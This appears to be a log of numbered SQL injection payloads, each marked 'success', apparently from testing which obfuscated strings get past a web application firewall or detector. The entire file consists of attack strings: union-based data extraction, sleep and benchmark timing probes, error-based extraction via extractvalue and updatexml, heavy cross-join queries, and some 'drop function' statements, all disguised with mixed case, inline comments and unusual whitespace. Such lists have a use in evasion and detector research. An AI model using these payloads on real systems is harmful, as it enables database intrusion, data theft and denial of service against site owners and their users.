519 success '1  )   OR\nsleep /*vA\nVa*/(  0x5  ) \n# '
526 success "-6550'  )   WHEre 4230 LIKE 4230 union all SEleCt 1675,1675,1675,1675,(SELECT 1675),(SELECT 1675),1675-- \\"
532 success 'SElECt   (  CasE whEn   (  6804   liKE   7050  )   THeN 6804 eLse cast  (  1 aS int  )  /  (/**/ seLeCT 0x0 From dual  )  \nEnd  )   frOM dual-- '
534 success "-6906' WhERe 0x72f  =  1839/*N/U>*/union all/**/SeLEcT\n1839,1839,1839,0x72f,1839-- 5k|"
537 success 'selECt   (  caSE When  \x0b(  7645   LIKE   5921  )   THEn 7645 eLSe 0x1ddd*  (  SELeCt (Select 7645) frOM information_schema.character_sets  )   eND  )  # '
540 success '0x1\nuni on/**/select all from where '
541 success '1  )\n  wheRE \'QP"(\' lIKE \'QP"(\' '
543 success '-1653 union/**/all SeLEct 8415,8415,8415,8415,8415,8415,8415,8415# 1Z&i^'
547 success ' SELECT * FrOM users WHERE id   LIKe   1 union SELEct @ 1a,version  ( \xa0/**/ )   -- 1 '
554 success "selEct/**/count  (  * \xa0)   fROM domain.domains AS t1,domain.columns As t2,domain.tables AS t3 ANd    (    (   'wusq'   like   'wusq "
558 success "0x1'\x0b )  /**/order by 0x1# U"
560 success '1"  )   aS lipa whERE 0xd7a  =  3450  aNd  make_set  (  9557 LIKE 9557,8899  )  -- WP'
562 success "-5109   )    )     )   OR make_set  (  0x19e3   lIKE   7331,7331  )   &&    (    (     (  '8'<>'8^' AnD 9929<>9930 ANd 'X]a.' Like 'X]a.' AND '5'!='5V' "
563 success "-2820'   )  \n )     OR  (SelEct (seleCT 0x1a17))   liKe/**/  8848-- .\x0cE|"
566 success '1" where 4433 IN (4432,4433,4434) '
568 success "-6639'  )   as trll where 6271   like   6271 AND True union/**/all select 6271,0x187f,6271# S"
569 success ' SELECt * fRoM users wHERe id   like   1 oR @#"  (  \t  like   1 Or (SElEct 1)   like   1 -- 1 '
570 success 'SELEct   ( /**/CASe WheN /**/ (  3539   liKe \x0c (sElEct 8768)  )   tHEn 0xdd3 elSe cast  (  0x1 aS int  )  / \xa0(  SelEcT 0 From dual  )   END  )   FroM dual-- l0cs'
574 success "-(SELECT 4775)'  ) \t OR 0xbde  =  3038 "
575 success 'if  (/*{>w*/ 4735   like   8907  )   select 4735 else drop/**/function qigo-- '
577 success "1'/**/where 1628  =  1628 "
580 success '(sEleCT (SeLECT 0x1))"\x0bunion all/**/sEleCt null,null,null,null,null,null,null# iH\xa0@$'
582 success '1"  \x0c)    )    as hace wheRe 0x2251   LiKE   (seLecT 8785) '
583 success '-9145\'  )   As xyya\x0cwheRE \']^"%\'<>\']^"%9\' union all SELECt 8950,8950,8950,8950,8950,8950,8950,(SELECT/**/8950)-- '
586 success "-(SeLeCT\n5425) Where '''=''' union/*\\*/all SELEct 0x172d,5933,5933-- "
589 success '-0xcb2%" union/**/all\tSElect/**/7162,7162,7162,7162,7162,7162,7162,7162,7162-- '
590 success "0x1'+\x0b (  select\x0c'ohdf' where '~'!='~g' AND 0x162e   LIKE   0xccd-- "
591 success '-8777"/**/ )   aS lalf WherE 8606   LIkE   (seLeCT 0x219e) Or elt  (  4397   liKE   5823,5823/*Dh*/ )  -- ~R'
592 success "-4406%'/**/union all SeLEct 9599,9599,0x257f,9599# "
599 success "-6370'\t /**/)    )    AS sims WhERe 9388   like   0x24ac union/**/all seLeCt 9388,9388,9388,0x24ac,9388,9388,9388,9388# "
601 success '-4817 union all\tSelEct 7415,7415,7415,7415,7415,7415,7415,7415,7415# '
605 success ' (  (SelecT 0x1bba) \x0b Like /**//**/0x1bba And sleep  (  (sELEct 5)   )    )  '
606 success "1'  )   WHErE (SELEct 5680)   Like   5680\x0banD   (  0xbcc   lIke   3020/*BJ*/ )\n *6703-- PR"
608 success "-7006' WHEre/**/9288!=9289 union all SELEcT 6966,6966,6966,6966# M"
610 success "1%'  )  /**/union all/**/SELeCT null,null-- "
616 success '1 union all/**/SeLECt null,null,null,null,null,null# \x0b<,W'
618 success "-4055'   )    )    as yoez where 2665 LIKE 2665 AND 'c8' NOT LIKE 'c8m' OR   (  8459   lIkE \n 8459  )  *4906-- G 3u"
619 success "1'   )    )    aS icik WHERe 1440  =  0x5a0 AnD 8189   lIke     (  selecT count  (  *  )   FRoM sysibm.systables As t1,sysibm.systables AS t2,sysibm.systables As t3  )  -- "
620 success " SeLEct * From users\xa0WHerE id  \x0cLiKE   '1' union SElECT +\\.,@@VERSION -- 1' "
621 success '-0xfcd/**/union all sELEcT (sELect\x0b6857),6857,0x1ac9,6857,6857,6857,6857-- 5I'
622 success "oR 1  =  1 aNd True and 'A]' NOT LIKE 'A]?' /* "
624 success '1"  )   as aifd where 6436<>6437 OR False AND \'u9s"\' NOT LIKE\x0c\'u9s"a\' '
628 success ' oR 1   LiKe   (sEleCT 0x1)/*\x0c-X*/or ""  =   '
629 success 'sELect   (  Case WHEn   (  4297   like   0x237e  )   ThEN 0x10c9 ElSE 1/  (  SElecT 0/*79WY*/ )   enD\x0c )  -- '
631 success '0x1 and/**/sleep\xa0 (  5\x0c )  '
633 success "1'||\x0c (/**/ select 'boxx' WHere\t2038   LIKE   2038 OR False Or False And 0x23ee  =  0x23ee or/*Ntk^*/9423<>0x24cf-- "
635 success "-8881%' union\nall SElect 8420,8420,8420,8420,8420,8420,8420# "
636 success "1'||  (/**//**/select 'lzzr'/**/WhERe 2477 \xa0=  0x9ad ANd 6206 LIKE 6206 OR\xa09605!=9605 "
638 success "-2397 \t )    )    As oizy wHEre '[8<' not like '[8<#' union/**/all selecT 1746,1746,1746,1746,1746,1746# "
644 success '1  )  \naND 0x20d7   LIKE     (  sELEct count  (/**/ *  ) /**//**/fRom generate_series  (  1,0x4c4b40  \x0b) /**/  )    '
645 success '/**/selECt * FrOm users WhERe id  =  1 oR\n".@" Or \'YJ\'!=\'YJ4\' -- 1 '
646 success 'iF  (  8284  =  6171  )   SeleCT 8284 eLsE Drop function mbih-- '
649 success '-0x1edd \x0c)   order/**/by 1-- c9'
650 success '0x1  )  \nas rnfb where/*J*/0x965   like   0x965 or 8514   LIKE   benchmark  (  0x4c4b40,md5  (  0x544d5a4c   )    )   # O'
654 success '0x1" where \'^c<hX\'\tLIKE/*Cy*/\'^c<hX\' '
657 success "1 aND elt  (  '0'/**/like\n'0' ANd 1,7259  )   "
658 success "1' where/**/'5F' NOT LIKE '5F1' OR 0x0 union all SeleCt null,null,null-- \\"
663 success "-2630'   )    )    as xavw Where 6291   LIKE \x0c 6291 union all seleCT 6291,6291,6291,6291,6291,6291,6291,6291,6291# >y*"
665 success '1  )   AS odqn whERE 3910  =  3910 '
668 success '-2658  )   as casi\x0bWhERe 8250!=8251 AnD 3912 liKE 3912 or 0x2035  =  9651-- h\x0c'
673 success 'seLEcT   (  case whEN   (  7033  =  1594  )   Then 0x1b79 eLsE 7033*  (  SeleCt 0x1b79 FroM information_schema.character_sets  )   eNd  )  # '
674 success '1"  )   as semi/**/where \'e\' like \'e\' AND 3258<>3259 '
676 success "0x1'  )   WHErE\x0c1445 IN (1444,1445,1446) oR 0x113b   LIKE     (  seLEct count  (  *  )\xa0  fROm sysusers as sys1,sysusers As sys2,sysusers as sys3,sysusers As sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7  ) \x0c-- Lyg"
686 success '1 Or 0x113b  =  \x0b (  seLecT count  (  *  )   FrOM sysusers as sys1,sysusers As sys2,sysusers AS sys3,sysusers AS sys4,sysusers/**/aS sys5,sysusers As sys6,sysusers aS sys7\xa0 )  -- ctdx KunOf'
689 success ' SeLecT * FrOM users WhERE id  =  0x1.*1 union selECT 1,banner/**/FRom v$version wHEre rownum   lIke   1\x0b-- 1 (>-'
690 success "-3420 where 'S:`u'<>'S:`uQ' AND True OR False AND True OR/**/0 || make_set  (  2438  =  1977,1977  )  -- "
691 success ' union   (  select NULL, NULL,   (  select/*0x3\ryo<*/@@version   )    )    -- '
692 success "-2298%'/*nI*/Or 1 group by concat  (  0x7171706a71,  (  selECT   (  CasE whEN   (  4232   LIKE   4232 OR 3368<>3368  )   tHeN 0x1 ElSE 0 End   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   \thaving MiN  (  0  )  # "
693 success "waitfor delay '0:0x0:5'\x0band 'gsvt'   like   'gsvt "
695 success ' SELECT * fROm users WhErE id  =  1 OR "._" oR 1   like   1 --/**/1 '
696 success "1' && 8514/**/  LIKE     (  sEleCt count  (  *  )   fROM domain.domains aS t1,domain.columns aS t2,domain.tables AS t3  )   "
698 success '1"   )    )    As eglv WheRE 90<>91 OR 4086 NOT LIKE 4086 AND 7492 LIKE/**/7492 union all SElECt null# 0yu'
699 success '1   )    )    As wwkw whERe 7289  =  7289 aND 7533  =  7533-- '
700 success "0x1'  OR  0x93f   LIKE     (  SelEct count\x0c (  *  )   FrOM/**/rdb$fields as t1,rdb$types As t2,rdb$collations as t3,rdb$functions as t4  )  -- "
701 success '-9841 wHERe 4612   LIKE /*G]*/ 4612 union all SELECt 4612-- '
702 success '-9434"  )   AS cqlw WheRE 1600  =  1600 oR 2733  =  1047-- t'
706 success "1'  )   as ohcs\x0bWHerE 2661<>2662 AND 1 Or 0 Or elt  (  525 NOT LIKE 526 aNd True OR False,sleep  ( /*M#rU*/5   )    ) /*}&\x0cHN*/ -- ,S"
707 success "1  ) \t WheRe 'M' lIkE 'M' AnD elt  (  5396 LIKE 5396,sleep  (  5   )    )   -- "
708 success '1"  )   wHeRe 0x1010 /**/ like   4112 '
709 success '-9432   )    )    AS nqya wHerE 8387 \n=  0x20c3 oR elt  (  9242   LIKE   6180,6180  )  -- w'
711 success "1'  )   Or 0x93f   Like     (  seLeCt count  (  *  )   From rdb$fields As t1,rdb$types AS t2,rdb$collations aS t3,rdb$functions aS t4  )  -- "
712 success "0x1'  )   aS syer WHEre 't' NOT LIKE 't\\' rlike   (  seleCT   (  CaSe WhEn   (  6233  =  7567  )   tHen 1 ELSE 0x28 END   )    ) \n -- "
713 success '-7971   )    )    AS armw wHeRE/**/9474   LIke \n 9474 OR make_set  ( \t1414 NOT LIKE/**/1415,0x1c11  )  -- x'
715 success ' sElEcT * FroM users WHerE id   liKe   1  OR  1#"? OR 774 iN (773,774,775) -- 1 C;6\x0b'
718 success "1'||  (  select/*&C*/'mzsy' WhEre 4940   LIKE   (SeLect (SELECT 4940)) oR\x0celt  (  5873   LIKE   0x16f1 OR (SELECT 0),sleep  (  5/**/  )    )   # "
720 success ' EnD &&    (  /*,Z5?*/ (   "dmgj"   like   "dmgj '
722 success "1'+ /*+mkI*/(  sElEct nash WHerE 4159  =  4159 OR 0 AND 'I' NOT LIKE 'I<' union all Select null# "
725 success '1"  Or    ( \x0bSeLECT 2*  (  If   (    (   SEleCt/**/* FROM   (  SeLecT concat  (  0x7171706a71,\xa0 (  SeLeCt   (  elt  (  8306 LIKE 8306 OR False AND 1,0x1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 0x7538dcfb7617fffa   )    )     )   '
726 success "(SELECT 1)' where ';2Oh'<>';2Ohe' AND 9906 NOT LIKE 9907/**/"
727 success 'SELECT  \n(  CASe WhEn   (  (sELecT 5418)   lIkE   6516  )   tHEn 1 else 5418*  (  SElecT 5418 FroM master..sysdatabases  )   EnD  )  -- <'
730 success '-1487"  )   aS crfi WHERe \'RB7\' NOT LIKE \'RB7w\' AND 6338 NOT LIKE 6339 AnD True union all SELECT 2407,2407,0x967,2407,2407,2407,2407,2407,2407,2407-- Vrk'
732 success 'sElect count  (  *  )   frOm generate_series  (  1,5000000  )   && "ihbe" LiKe "ihbe '
738 success '0x1c%\xa0'
741 success '1 wheRe 5443\t\x0b liKe /**/ 5443 '
743 success "-2817  )   WheRe '\r'<>'\rV'\t|| 3266   LIKE \x0b 1102 "
746 success 'sEleCT caSE WHEN 3661   like   9315 tHEn 1 ElSE null eND--\n'
749 success '1  )   where 662<>663 '
752 success " SElECT * fRoM users WhErE id  = \t'1' Or \\<$ union sEleCt 1,@@VERSION -- 1' "
754 success "-2120'  )   oR 8734  =  8844# 9eS$"
759 success "0x1'||  (/*|jH*/ select 'zyvk' FRoM dual wHEre (SEleCt 0x818)   lIkE   0x818 "
761 success '1" where 7213<>7214 anD True union all SeLeCT null,null,null,null,null,null,null-- '
762 success ' sElecT * FrOm users wHeRE id  =  1 || "  (  _" or \'lr\'!=\'lrV\' -- 1 '
764 success '0x1  )   As ghew whEre 6441   LIKE   6441 ANd 1 AND 1 union all seLECT null,null-- -I'
765 success "0x1'  )   where 'b' NOT LIKE 'bC' "
770 success '1"   )   \n)    union/**/all SelECt null,null,null,null,null,null,null# \\\x0c{'
774 success 'SeLect   (  caSE whEN   (  3863   like   1151  )   THen 3863 ELSe cast  (  1 AS int  )  /  (  selEct 0 From dual  )   End  )   FROM dual-- '
775 success "1' iN boolean mode  )    Or  sleep  (  5/**/ ) \n# 9D\nlp`"
776 success "0x1' WHErE 2208 NOT LIKE (SELECT 2209) OR updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  selECt   (  elt  (  'ft'<>'ft{',1   )    )     )  ,0x717a767a71  )  ,8666  )  -- \tR"
777 success '1  )   WHeRe\t7096   lIke /**/ 7096 '
779 success "-0x197f'   ) /**/  ) \x0b  union all SelECt 0x13bd,0x13bd,5053,5053-- "
780 success 'if  (  1928  =  4811 \t)   sElect 0x788 ELsE dRoP function ucko-- '
782 success "waitfor delay/**/'0:0:5' &&   (  4614\n  LIKE   4614 AND True "
783 success '-5575" union all/**/sELeCt 8665,8665,8665,8665,8665,8665,8665-- '
785 success '1,  (  SElecT   (  Case When   (  1260 NOT LIKE 1261  )   thEN\n1 eLSe 1/  (  SElECt 0  )   END   )    )   \xa0'
786 success '0x1"   )/*L*/\x0b  )    As ynuw WHeRe (sElEcT 9138)  = \xa0(sELEcT 9138) '
788 success 'SElect * FroM users WherE id \n=  1 + $+%1 || 0x1   like   (SELECt 1) -- 1 Mr'
789 success 'iif  (  7011   lIKE   2522,1,1/0  )   '
790 success '1 AnD 6510  =    (  sELeCT count  (  *  )   fROm sysusers AS sys1,sysusers As sys2,sysusers AS sys3,sysusers AS/*4fw[Q*/sys4,sysusers As sys5,sysusers As sys6,sysusers as sys7  )  -- ixlk '
796 success ' SeleCt * fROm users wHERe id  =  1/**/oR/**/";[" oR 9452!=9453 aNd 4109<>4110 AND 2387 NOT LIKE 2388 aND True anD \'n\'=\'n\' and 8311 Like 8311 And 1 OR 6048 NOT In (6047,6048,6049) anD True -- 1/**/n:6\n'
797 success 'declare @s varchar  (  (SELECT (SELECT 200))  )   selECt @s    like    0x77616974 ... '
798 success "-2223'   )    )    as mjwp wHErE 8650  =  8650 OR False AND 1 OR 7900  =  5838 "
802 success '1 where 2301  =  2301 OR False OR False '
804 success 'sELecT LIkE  (  \'abcdefg\',upper  (  hex/*xe,5\r*/ (  randomblob  (  0x1dcd6500/2   )    )      )    )    && "ejmj" liKe "ejmj '
805 success '0x1,exp  (  ~  (  sElect * froM   (  sELEcT concat  (  0x7171706a71,  (  seLect   (  elt  (  7759   LIKE   7759 AND True,0x1   )    )     )  ,0x717a767a71,0x78   )  \x0b )   x   )    )    '
806 success 'SELECt count  (  *  ) \x0b from sysibm.systables aS t1,sysibm.systables aS t2,sysibm.systables As t3-- '
807 success "-1606'||  ( /*MN*gc*/select 'qbaa'/*\xa0H&z4*/where 'fv'='fv' OR 0 union all Select 3967,0xf7f,3967,3967,0xf7f-- "
808 success '1  )   ANd make_set  (  8403  =  8403 AND 1810 LIKE 1810,8899  ) \x0c '
810 success "1'\x0bwhere (SELECT 1593)   like   1593 "
811 success '1"   ) /**/  )    As vhrq WhERE 9514 NOT LIKE 9515 OR \'+\' LIKE \'+3\' OR False AnD 7882 not like 0x1ecb AND elt  (  \'U5jI\' NOT LIKE \'U5jI{\',sleep  (  5   )    )   -- '
817 success "0x1' IN boolean/**/mode  )   union all/**/SELect null,null,null,null,null-- "
818 success '1/**/aND elt  (  0xdb9 LIke 3513 Or 0,sleep  (\x0c 5   )    )   # macc &]:'
822 success 'iif  (  4460   LIKE   1610,1,1/0  )   '
823 success ' SELEcT * fROm users WHERe id  =  0x1 OR @#",  =  0x1 union SelEcT 1,version  (    )   -- 0x1 '
827 success '0x1"  )   aS tnux wheRe 7628 not like 0x1dcd rlike/**/  (  SeLect * FroM \x0b (  selECT  (  sleep  (  0x5   )    )     )  vwyq  )  # '
829 success 'SElEcT/**/CasE wHen 2599   lIKe \x0c 7035 thEn 1 eLSe null End-- '
830 success "seLeCt/*:Vk }*/count  (  *  )   froM domain.domains As t1,domain.columns aS t2,domain.tables As t3 &&   \x0b( \x0c  (   'zaru'   like   'zaru "
831 success '-6731" where \'{.6p\'<>\'{.6pq\' union all/**/select 6166,0x1816,6166,6166,6166,6166-- '
834 success '(SeLECt (SELECT 0x1))" WHERE 0xa3b  =\xa0 2619 ANd 0xb07   like   0x13ec# '
838 success ' SElEcT * fRoM users whErE id  = /**/1 or/**/@#"{  =  1 Or 1  =  1 AND True -- 1 '
840 success ' SELecT * fROm users WHErE id  =  1. union seLECt null,version  (    )   -- 1 '
843 success "-0x1503'  )   union all sELEcT 4294,4294,(sELecT/*\nJz<W*/4294)-- "
846 success "1'+/**/ (  select 'sacd'\twhERE 7544 NOT LIKE 7545 OR 0/**/union all SeleCT null,null,null,null,null,null,null# "
848 success "-(SELECT 0xb60)'   ) \x0b\xa0 )    order/**/by\n1-- /D#V"
853 success ' (  CaSE WHEN 8422  =  8452/**/ThEn 1 ElSe null End  )  '
855 success 'seLect count/*\rs9*/ (  */**/ )   fRom sysibm.systables as t1,sysibm.systables as t2,sysibm.systables As t3 AND    (    (   "%"   lIkE   " '
858 success 'iif  (  4638   like   8258,1,0x1/0  )   '
860 success "0x1'+  (  sElEcT eluw WHERe 6210  =  6210 AND 'o/:' NOT LIKE 'o/:n' AND 711!=712 "
863 success ' sElect * fROM users wheRE id  =  1 *\\. union SELect null,@@VERSION\t-- 0x1 '
864 success '1%"  )   union/**/all SELect null,null,null,null,null,null,null,null,null-- \'5'
865 success ' SElect * FrOM users whErE id  =  1\x0cOR (seLECt 1)#"? union SELEct \'a\',version  (    )   -- 0x1 /<'
866 success '-8128" \x0c )    )    as ovjz WHere 3583!=3584 OR False union all/**/selEct 7375,7375,7375,7375,7375,7375,7375,7375,7375-- \r'
868 success '-9958"  )   AS jzvq/**/wHErE 3741   LIKe   3741 ANd \'<v\' NOT LIKE \'<vj\' union all sELecT 3741,3741,3741# &\x0c'
869 success '-(SELECT 5539)"\t/*B*/)\t\t/**/union all SElECt 6189,(SEleCt 6189),6189,6189,6189,6189,6189,6189,6189-- WFt'
870 success 'selEcT count  (  *  ) \x0b From sysibm.systables AS t1,sysibm.systables As t2,sysibm.systables as t3 And   (  "lsvg" LIkE "lsvg '
876 success '1"   )   /**/)  \xa0 as xcyo where 4300 NOT LIKE 4301 AND True '
880 success "-9739' Or 0x217b   LIKE   0x217b-- "
883 success '1  )   As tbve wherE 4828 /**/=  4828 '
884 success "1' iN boolean mode  )   && 2388   LIkE   benchmark  (  5000000,md5  (  0x6d457153   )    )   # "
885 success 'iif  (  5257   Like /**]Vt*//**/(selecT 5257),1,(sElEct 1)/0  )   '
888 success 'SEleCT   (  cASe whEN   (  8978   like   1426  )   TheN 1 else 8978*  (  sELEct 8978 FroM master..sysdatabases  )   ENd  )  -- m'
889 success '1   )    ) \x0b  aS gxvp WHeRe 3865/**/  LiKE   3865 '
890 success '-7395%" order\xa0by 0x1-- A'
891 success " (  SEleCT * frOM\t  ( /**/sELect \t(  sleep  (  (SEleCT 5)   )    )   /*&&I*/ )  srmq  ) /**/ && 'fdgq'   lIke   'fdgq "
892 success "-1236'+/*S$*/ ( \x0cselect 'fbgh' wHeRe 0xf38   liKE   3896 union all/**/selECt\t3896,3896,3896,0xf38,3896,3896,3896,0xf38,3896-- -7"
895 success "-(SeLeCt 8521)'+  (  SeleCT ucim wheRe 0x232b   like  /**/9003 union all SElect 9003-- "
896 success '-2013"   )    )    aS kisy whEre \'S\'<>\'S$\' OR 0 OR False OR 3170!=3170 OR 0x170f  =    ( \x0b\'qqpjq\' OR   (  seLeCT caSe 5903 whEN 5903 tHeN 1 eLSe 0 end/**/FROm rdb$database  )  ||\'qzvzq\'  )  -- '
897 success ' sELeCt * FrOm users WheRE id   LIkE   0x1/**/+\\. union selecT null,@@VERSION -- (SELECT 1) '
900 success '-(SELECT 9265)"  )   OR 7834  =  1685 '
901 success "1'+  (  select 'xqjx' where 5531<>5532 AND 1 AND 6131 IN (6130,6131,6132) AND '3\x0c' NOT LIKE '3\x0c7' ANd 9198   LIKE   9198 ANd 3401 In (3400,3401,3402)-- tC"
903 success 'SELeCT   (  cASe wHEn   (  3537  =  5218  )   TheN 3537 eLSe (sELecT 3537)*  (  seleCT 3537 frOm mysql.db  )   ENd  )  # '
906 success '-5640"   ) \t  )    or/**/9792   LiKE   (SELECT 2728)-- '
907 success '1"  )   As uyns WHEre 4751 \t LiKE   (SELECT 4751) || False ANd   (  Select * FROM   (  seleCT  (  sleep  (  5   )    )     )  fzno/**/ )  -- _'
909 success "1'   ) /**/  )    As babx whEre 9373 IN (9372,9373,9374) OR 1022   LIKE  /**/  (  SEleCt count  (  *  )   FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- "
910 success "0x1'   )    )    AS iuta whErE 1482   LIKE   1482 "
911 success ' \t(  SELEct count  (  *  )   frOm\x0csysibm.systables aS t1,sysibm.systables as/*&*/t2,sysibm.systables AS t3  )   '
913 success '|| 1 IN   (  SeLECT @@version  )  -- Vu'
914 success 'SEleCT CASE wHEn 7634   like \x0c 0xf72 theN 1 elSe null End-- '
915 success '1  )   AnD extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  SElEct   (  elt  (  8559<>8560 oR False,1   )    )     )  ,0x717a767a71   )    )    '
916 success "0x1'/**/ )  /*[Y4*/WhEre 0xaa5   Like   (SElecT 0xaa5) aND 9254   liKE   \x0b (  seleCT count  (  *  )   frOm rdb$fields\xa0As t1,rdb$types AS t2,rdb$collations as t3,rdb$functions aS t4  )  -- "
919 success "0x1' wheRE 2919 NOT LIKE 2920 AND 'u' NOT LIKE 'u~' AnD 8189   LIKE     (  SeLEct count  (  *\x0b )   FrOM sysibm.systables/**/aS t1,sysibm.systables AS t2,sysibm.systables As t3  )  -- "
921 success '(seLEct/**/1)  )   wheRe 7599 NOT LIKE 7600/*?P,B*/'
922 success "1  )   Or 0x1a89   LIKE     (  sElECt 6793 froM pg_sleep /**/(  5   )    )    AnD /**/ (  'H' lIKe 'H' "
923 success 'select count  (  *  )   from/**/rdb$fields as t1,rdb$types as\nt2,rdb$collations as t3,rdb$functions as t4 AND   (  0x5c1   LIKE   0x5c1 '
925 success '0x1   )    )    AND sleep  (  (sElecT 5)  )   AND    ( \t  (   0x237c  =  0x237c OR False OR 6741<>6741 anD 1 '
926 success '0x1   )    )    as sfan wHErE 7176   LIKe   7176 AND\t3707 likE 3707 OR 3378 NOT LIKE 3378 OR False anD 7017  =  7358 '
930 success '1 \x0b)   aS ewnv WhERE (sElecT 6698)=0x1a2a ANd 2716   LikE     (  sELEct count  (  *  )   FROm sysusers AS sys1,sysusers as sys2,sysusers As sys3,sysusers As sys4,sysusers AS sys5,sysusers as sys6,sysusers As sys7  ) \x0c-- 5T'
932 success '1 WHERE (sELecT 2382)   LIKE \x0c 2382\x0bANd True/**/'
935 success " Or uname LikE '% "
938 success '1  )   WHERe 1487   like   1487 AND 1 '
939 success '0x1"   )    )  \t AS sgln Where 7573   likE   0x1d95 '
944 success "-9358' Or 9887   LIKE   2569-- "
946 success "-(SELECT 6030)%'  )   OR 3038  =\x0b 3038 "
947 success '1"  )   as dgzf where\t1109 IN (1108,1109,1110) AND \'`M#Zp\' LIKE \'`M#Zp\' '
948 success "1'\tAnD 9198   like \t (selEct 0x23ee)  OR  0-- "
949 success '-(SelECT 6076)"   )  /**/ )    OR 8277 \x0c lIKe   0x1295 '
952 success 'seLECT count  (  *\n ) \n From domain.domains as t1,domain.columns AS t2,domain.tables As t3 AnD "%"   LIKE  /*;ro%6*/" '
953 success "waitfor delay '0x0:0:5' "
955 success ' SeLect * fROm users wHeRe id  =  1 Or @#";  =  1/**/or \'bV\' NOT LIKE \'bVG\' -- 1 '
956 success '1" WHeRe 0x24f5  =  9461 '
959 success '-8868" \xa0)   wHerE 6331 In (6330,6331,(seLECt 6332))/**/union all SEleCT/*w5*/5681,(seLeCt 5681),5681,5681,5681,5681,5681,(SELeCT 5681),5681,5681-- '
963 success "1'/**/ )   as ibaw where 5587<>5588 && 9198  =/**/ 9198-- "
964 success "1'+  ( /*MA>d*/seLECt rdwb WHERe 2498  =  2498 Or 6404<>6404 aND 3429  =  7639-- "
966 success "a'\x0b-- (8}4"
967 success "1'+  (  select 'vtyw' WheRe 889 LIKE 889 order by 1-- "
970 success 'seLeCT   (  CASE wHEn   (  6166   LiKE   3364  )   tHeN 6166 else cast  (  1 As int\x0b )  /  (  sElEct 0x0 FRom dual  )   ENd  )   FrOM dual-- '
971 success "-5130'   )    )    union all SELEct 5218,5218,(SelEcT 5218),5218,5218,5218,5218,5218,5218,5218-- "
975 success 'SeLeCt   (  case WHEn  \xa0(  8331   liKe   0x15f9  )   theN 0x208b/*)P[*/ElSE 0x208b*  (  sElecT (sElect (seLecT 8331)) FRom mysql.db  )   END/**/ )  # 1?]'
976 success "1'  ) \x0c as dpmh/**/where 5281  = \n0x14a1 and 9322 NOT LIKE 9323 AND True "
977 success '0x1 ANd sleep  (/*]uU*/ 5  )\t # '
979 success 'SElECt pg_sleep  (  5  )   And "zhsc"   like   "zhsc '
980 success 'SELECt\nbenchmark  (  0x4c4b40,md5  (  0x4c4d6142   )    )   # idxq \\'
987 success '1"/**/union\tall sELeCT/**/null,null,null,null,null,null,null,null,null,null# '
988 success 'selEct   (  CASe wHEn   (  (SELECT 9030)   LIKE   0x23e1  )   TheN 9030 ElSe 9030*  (  seleCt 9030\x0bfroM information_schema.character_sets  )   enD  )  # O1'
990 success "1'+  ( /**/select dklj where 3265   like   3265 "
993 success "1'  )   wHerE 5871 /**/ lIke   5871 "
995 success "1'/**/ )   WhERe 6273 IN\x0c(6272,6273,6274) "
1000 success '1 WHere 8398 /**/ LIke  /**/0x20ce '
1003 success '0x1"   )    )    As jrld wHEre (SeLECT 3488)   like   3488 '
1005 success "eNd aND    (    (     (  'xzbk'/**/  like   'xzbk "
1006 success '1"  )   WHErE 0x729  =  1833 aNd 1/**/and True\n'
1009 success '"  )   oR benchmark  (  10000000,MD5  (  (sElect/**/1)   )    )   # '
1011 success '-0xcf9" WHerE \'f\' NOT LIKE \'f4\' union/**/all seLEcT 1603,1603,1603,1603# '
1012 success 'if  (  8995   like   9787  )   select 8995 else drop/*-X*/function ofgg-- '
1014 success '(SELECT 0x1)" OR 0x2112   LIKE   benchmark  (  5000000,md5  (  0x694a4745   )/**/   )    '
1015 success "1  )   wHeRE 'T.}'!='T.}Y' OR 4915   lIke     (  sELECt count  (  *  )   From domain.domains AS t1,domain.columns aS t2,domain.tables AS t3  )  -- "
1017 success '-9037%" union all/**/SelECT\x0c0x19b7# $;U;'
1018 success "-1641' union all SeleCT 0x12e3# QM"
1019 success "-9429'  )   order by/**/1-- "
1021 success "(selEcT 0x1)'  )   OR 0x1333   LikE     (  sElEcT count  (  *  )   FRom domain.domains AS t1,domain.columns aS t2,domain.tables As t3  )  -- C\\"
1022 success 'elt \n(  2567   LIKE   9921,9921  )   '
1024 success "SELeCt count  (  *  )   fRom sysibm.systables as t1,sysibm.systables AS t2,sysibm.systables AS t3 aND    (    (   'ootz' liKE 'ootz "
1028 success 'seLecT   (  CAsE wheN   (  9246   LIKE   6326  )   tHen 9246 ELSE 9246*  (  selEcT 9246 frOM mysql.db  )   end  )  # &`u'
1031 success "SelECT/**/pg_sleep  (  5  )   And '%' \n liKe   ' "
1033 success "SELeCt count  (  *  )   froM sysibm.systables aS t1,sysibm.systables aS t2,sysibm.systables As t3  )  +' "
1035 success "1'   )    )    As jtmf wHERE 5040 iN/**/(5039,5040,5041) "
1036 success "-4811'\xa0  )    )     )   union all SeLect 4603,4603,4603,4603,0x11fb,4603,4603,4603,4603-- "
1038 success "1'  )   && 6646 IN (6645,6646,6647) or 8171 NOT LIKE 8171 "
1039 success "SEleCT count  (  *  )   From\x0ball_users t1,all_users t2,all_users\x0bt3,all_users/**/t4,all_users t5  )  +' "
1043 success "0x1'/**/rlike sleep  (  5  )  "
1044 success 'SELEcT   (  CaSE wHeN   (  7822   liKE   (sElECt 4430)/**/ )   ThEn 7822 ElSe 1/  (  selEct 0  ) \t eNd  ) \x0c-- fz'
1047 success '1  )   WHERE 6090   LIkE   6090 or 7677 NOT LIKE 7677 '
1048 success 'SeLEcT count  (  *  )   from rdb$fields As t1,rdb$types AS t2,rdb$collations As t3,rdb$functions AS t4 anD    (    (   6977  \xa0lIke   0x1b41 '
1049 success "  )   oR sleep  (  __TIME__  )     LIKE   '\n"
1050 success '-1203"   )    )    OR 9698 IN (9697,9698,9699)--/*KMEv*/'
1051 success '-0x253f"\torder by (SeLecT 0x1)-- <~'
1053 success " SeLEct * fRom users wHERe id   LIKE   '1' union sELeCT \\.#,@@VERSION -- 1' "
1054 success "0x1'  )   aS noqp wHERe 4042   LIKE   4042 anD 1 OR 8315   LiKE     (  SELect count  (  *  )   FROM sysibm.systables As t1,sysibm.systables AS t2,sysibm.systables\x0caS t3  )  -- [n7("
1056 success 'select case when 8227   LIKE   1229/**/then 0x1 else null end-- '
1058 success '1"  )   where/*dW**/4951  =  0x1357 AND 7694<>7695 '
